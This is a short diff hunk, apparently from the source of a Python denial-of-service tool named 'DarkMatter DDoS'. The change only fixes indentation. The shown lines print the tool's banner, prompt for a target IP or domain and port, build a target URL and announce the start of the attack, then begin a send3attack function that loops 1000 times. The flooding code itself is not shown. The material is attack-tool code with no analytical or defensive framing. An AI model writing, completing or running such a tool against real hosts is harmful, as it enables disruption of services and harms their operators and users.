@@ -68,12 +68,12 @@ def attack():
     except:
       pass
 
-  print("Welcome To DarkMatter DDoS\n")
- ip = input("IP/Domain: ")
- port = int(input("Port: "))
- url = f"http://{str(ip)}"
- print("[>>>] Starting the attack [<<<]")
- sleep(1)
+print("Welcome To DarkMatter DDoS\n")
+ip = input("IP/Domain: ")
+port = int(input("Port: "))
+url = f"http://{str(ip)}"
+print("[>>>] Starting the attack [<<<]")
+sleep(1)
 
 def send3attack():
   for i in range(1000): #Magic Power
